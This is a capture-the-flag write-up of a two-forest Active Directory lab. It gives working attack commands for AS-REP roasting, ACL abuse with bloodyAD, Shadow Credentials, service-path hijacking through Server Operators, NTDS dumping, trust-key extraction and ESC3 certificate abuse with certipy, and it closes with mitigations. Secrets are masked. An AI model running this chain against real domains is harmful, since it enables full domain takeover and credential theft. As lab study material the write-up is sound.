# Old Trusty: two Active Directory forests, two flags

[По-русски](solve.ru.md)

## 0. Setup and complete plan

The lab contained two Active Directory domain controllers in distinct, trusted forests:

- LEGACY: `dc01.legacy.corp` in `legacy.corp`;
- CORE: `dc02.core.corp` in `core.corp`;
- a forest trust linked LEGACY and CORE.

The objective was to read the flag on each controller's Administrator desktop. **Both flags were obtained.** This was not one attack repeated twice: the first route used ACL delegation, Shadow Credentials and Service Control Manager; the second used trust material, a PKI deployment configuration and Enrollment Agent certificate issuance (ESC3).

The whole path:

1. Recover a LEGACY account from an AS-REP roastable user.
2. Traverse the BloodHound ACL path to service account `svc_ops`.
3. Enroll a Shadow Credential, authenticate as `svc_ops`, and use its Server Operators rights for a service configuration change.
4. Obtain domain administrator credentials and read the LEGACY flag.
5. Extract forest trust material and request a CORE TGT for `LEGACY$`.
6. Find cleartext PKI automation credentials on the CORE Software$ share.
7. Request an Enrollment Agent certificate, then a certificate **on behalf of CORE Administrator using the User template**.
8. Authenticate with PKINIT as CORE Administrator and read the second flag.

The original evidence archive contains a full Russian writeup, Certipy/LDAP outputs, Python helpers, the PKI XML file and both flag confirmations. The public text masks IPs, working passwords, NT hashes and full flags. Several CTF instances were recreated during the run, so host and trust-secret values from different attempts are not interchangeable.

## 1. LEGACY discovery and AS-REP roasting

DC01 exposed DNS 53, Kerberos 88, LDAP 389/636 and SMB 445. Anonymous SMB and LDAP did not disclose useful data; an authenticated foothold was needed.

The team checked for users with Kerberos preauthentication disabled:

```bash
GetNPUsers.py legacy.corp/ -usersfile users.txt -no-pass -dc-ip <dc01> -format john
john hash.txt --format=krb5asrep
```

The result was a usable password for `jdoe`. This is an offline crack of an AS-REP response, not online password guessing. The credentials enabled authenticated enumeration and an ACL collection for BloodHound.

## 2. BloodHound and the delegated ACL chain

The useful path did not grant `jdoe` domain administrator rights directly. Instead:

```text
jdoe --WriteDacl--> Legacy App Maintainers
     --AddMember--> Infrastructure Support
     --AddKeyCredentialLink--> svc_ops
svc_ops belongs to Server Operators
```

The first edge allowed modifying the target group's discretionary ACL, the second allowed group membership changes, and the last allowed writing the target account's `msDS-KeyCredentialLink` attribute.

The preserved `bloodyAD` commands had the following sequence (DNs must be taken from the actual lab, not guessed from display names):

```bash
bloodyAD -d legacy.corp -u jdoe -p '<jdoe-password>' -H <dc01> \
  add genericAll '<Legacy App Maintainers DN>' '<jdoe DN>'

bloodyAD -d legacy.corp -u jdoe -p '<jdoe-password>' -H <dc01> \
  add groupMember '<Legacy App Maintainers DN>' '<jdoe DN>'

bloodyAD -d legacy.corp -u jdoe -p '<jdoe-password>' -H <dc01> \
  add groupMember '<Infrastructure Support DN>' '<jdoe DN>'

bloodyAD -d legacy.corp -u jdoe -p '<jdoe-password>' -H <dc01> \
  add shadowCredentials '<svc_ops DN>' --path svc2
```

Each edge mattered. `jdoe` could not impersonate `svc_ops` until the group and key-credential permissions had been followed.

## 3. Shadow Credentials and a failed built-in PKINIT

Adding a key credential enabled certificate-based authentication to `svc_ops`. The `bloodyAD add shadowCredentials` command attempted its own PKINIT, which failed with `KDC_ERR_ETYPE_NOTSUPP`.

The crucial observation was that the **PFX file was still saved to disk**. The operation was not lost. Certipy could use the saved material independently:

```bash
certipy-ad auth -pfx svc2.pfx \
  -username svc_ops -domain legacy.corp -dc-ip <dc01>
```

Certipy returned the NT hash of `svc_ops`. Its literal value is omitted from the public repo.

## 4. Server Operators and the SCM route

`svc_ops` was in `Server Operators`. That gives significant control over services but not necessarily the ability to write the administrative SMB share. Attempts with `psexec` and `atexec` failed with errors such as `share not writable` and `rpc_s_access_denied`.

The working path used the Service Control Manager directly:

```bash
python3 services.py 'legacy/svc_ops@<dc01>' \
  -hashes :<svc_ops-NT> -no-pass list

python3 services.py 'legacy/svc_ops@<dc01>' \
  -hashes :<svc_ops-NT> -no-pass change \
  -name ReportSync -path '<one-shot service command>'

python3 services.py 'legacy/svc_ops@<dc01>' \
  -hashes :<svc_ops-NT> -no-pass start -name ReportSync
```

The one-shot command in the original record created a local administrative user and added that user to Administrators. The account was verified as privileged on DC01. Its working password is omitted here.

This distinction explains why a failed `psexec` did not disprove the exploit path: changing the configuration of a service is a different privilege from uploading and starting a remote executable through an admin share.

## 5. Dumping NTDS and the first flag

With local administrator access to DC01, the team used the directory replication path to obtain domain hashes:

```bash
secretsdump.py 'legacy.corp/<local-admin>:<password>@<dc01>' -just-dc
```

A domain Administrator hash gave access to the `C$` share and `Users\Administrator\Desktop\flag.txt`. The LEGACY flag was accepted (`PP{...}`).

## 6. Transition to CORE: the limits of forest trust

CORE had a small principal set and no direct writable ACL path from the existing accounts to its Administrator. A trusted forest does not automatically grant domain administrator rights in the other forest; SID filtering also matters.

The next step was to recover trust material from LEGACY. A standard `secretsdump -just-dc` did not expose the necessary TDO secret. The preserved solution used `tdo_dump.py` with an RPC `ncacn_ip_tcp` endpoint. A named-pipe version had produced `access_denied`.

```bash
python3 tdo_dump.py -u Administrator -d legacy.corp -t <dc01> \
  --hashes <LEGACY-ADMIN-NT> \
  --tdo-guid <TDO-GUID> --dsa-guid <DSA-GUID> --debug
```

The output supplied trust-account keys and inter-realm AES material. These are **not** CORE's `krbtgt` key and cannot simply be used to mint an unrestricted CORE administrator ticket.

## 7. A CORE TGT as LEGACY$

The `LEGACY$` trust account is a real identity in CORE. Using the trust-account AES key:

```bash
getTGT.py 'core.corp/LEGACY$' \
  -aesKey <trust-account-aes256> -dc-ip <dc02>
```

CORE issued a TGT. The resulting access was ordinary domain-user access, not administrative access to `C$`. This was enough to enumerate permitted SMB shares and locate an independent vulnerability.

## 8. A cleartext certificate-automation account on Software$

The CORE share `Software$` exposed a deployment file at:

```text
Software$\PKI\LegacyClient\enrollment-agent.xml

<Domain>CORE</Domain>
<Username>svc_enrollment</Username>
<Password><masked></Password>
<Authority>CORE-CA</Authority>
<Template>EnrollmentAgent</Template>
```

The password was present in cleartext. This created a valid authenticated context for `svc_enrollment`, an account able to request certificates as an Enrollment Agent.

Before requesting certificates, the team enumerated the `certificateTemplates` attribute of the actual `EnrollmentService` CA object. This matters because an LDAP template object may exist but **not be published by that CA**. The CA offered the `EnrollmentAgent` and `User` templates required by the working route.

## 9. ESC3, certificate 1: become an Enrollment Agent

The agent account requested its own Enrollment Agent certificate:

```bash
certipy-ad req -u svc_enrollment@core.corp -p '<svc-password>' \
  -ca CORE-CA -template EnrollmentAgent \
  -upn svc_enrollment@core.corp -pfx svc_enrollment.pfx \
  -dc-ip <dc02> -ns <dc02>
```

This certificate authorized signing an enrollment request for another principal. It was not itself sufficient for the later Administrator PKINIT. That distinction caused a long debugging detour.

## 10. ESC3, certificate 2: Administrator with the User template

The second request used the Enrollment Agent certificate, requested `CORE\Administrator` **on behalf of** that principal and selected the `User` certificate template:

```bash
certipy-ad req -u svc_enrollment@core.corp -p '<svc-password>' \
  -pfx svc_enrollment.pfx -ca CORE-CA -template User \
  -on-behalf-of 'CORE\Administrator' \
  -upn administrator@core.corp \
  -dc-ip <dc02> -ns <dc02> -target dc02.core.corp
```

The key distinction is between the **agent signing certificate** and the **Administrator authentication certificate**. They are separate certificate roles and must not be interchanged.

## 11. The PKINIT failure and why the certificate template mattered

Early attempts requested a certificate using the wrong template, and PKINIT returned `KDC_ERR_PADATA_TYPE_NOSUPP`. The team investigated several hypotheses:

- A malformed SID certificate extension; this turned out not to be the cause.
- A broken or incompletely configured KDC/CA; later successful PKINIT disproved this.
- LDAP TLS/Schannel behavior; it restricted LDAP certificate authentication but was unrelated to the successful PKINIT path.

The decisive evidence was **Extended Key Usage**. The Enrollment Agent-issued certificate in the failed attempt did not have an EKU appropriate for client Kerberos authentication. It was inspected with:

```bash
openssl pkcs12 -in administrator.pfx -clcerts -nokeys \
  -passin pass: | openssl x509 -noout -text
```

The `X509v3 Extended Key Usage` and SAN/UPN fields were inspected. The certificate issued on the `User` template contained appropriate client-authentication EKU and UPN. The PKINIT step then succeeded. This is the most important troubleshooting lesson from the CORE part of the challenge.

## 12. CORE authentication and second flag

Using the corrected Administrator certificate:

```bash
certipy-ad auth -pfx administrator.pfx \
  -username Administrator -domain core.corp -dc-ip <dc02>
```

Certipy returned a TGT and the Administrator NT hash. The team confirmed privileged SMB access and downloaded the desktop flag:

```bash
nxc smb <dc02> -u Administrator -H <CORE-ADMIN-NT> -d core.corp

impacket-smbclient.py 'core.corp/Administrator@<dc02>' \
  -hashes :<CORE-ADMIN-NT> -no-pass
# SMB interactive session:
use C$
get Users\Administrator\Desktop\flag.txt
```

The CORE flag was accepted (`PP{...}`). The separate `FLAG1.txt` and `FLAG2.txt` in the original archive confirm both outcomes.

## 13. Dead ends worth recording

- **Direct CORE ACL writes:** neither `svc_enrollment` nor `LEGACY$` had password reset or relevant object-control rights; LDAP access-control inspections did not reveal a direct path.
- **Inter-realm key as a Golden Ticket:** `KRB_AP_ERR_BAD_INTEGRITY` occurred when a ticket was forged under the wrong key; SID filtering blocked referral-based privilege injection.
- **LDAP StartTLS/LDAPS:** 389/3268 returned LDAP result 52, and 636/3269 reset TLS handshakes. This did not mean PKINIT was unavailable.
- **Administrator password reset via LDAP:** `ldap 50 insufficientAccessRights`.
- **Unsupported templates:** `UserSignature`/`ClientAuth` were present in directory discussions but not issuable by this CA, returning `CERTSRV_E_UNSUPPORTED_CERT_TYPE`.
- **Wrong final certificate EKU:** the authorization to enroll on behalf of another principal and the suitability of the resulting certificate for PKINIT are two separate checks.

## 14. Lessons and mitigation

- Enable Kerberos preauthentication and defend against offline AS-REP password recovery.
- Audit delegated ACL paths, group memberships and modifications to `msDS-KeyCredentialLink`.
- Restrict Server Operators membership and service configuration changes on domain controllers.
- Protect trust-account secrets and honor SID-filtering boundaries.
- Remove plaintext service credentials from deployment XML files on shares.
- Review Enrollment Agent permissions, on-behalf-of issuance policies, certificate templates and EKU settings.

## 15. Evidence note

Original supplied source: `writeups/OldTrusty/README.md` plus `scripts/` and `evidence/` in the contest archive, including Certipy output, PKI enrollment XML and both flag confirmations. Public commands are a redacted rendering of the recorded path, not fresh runs against an active domain.
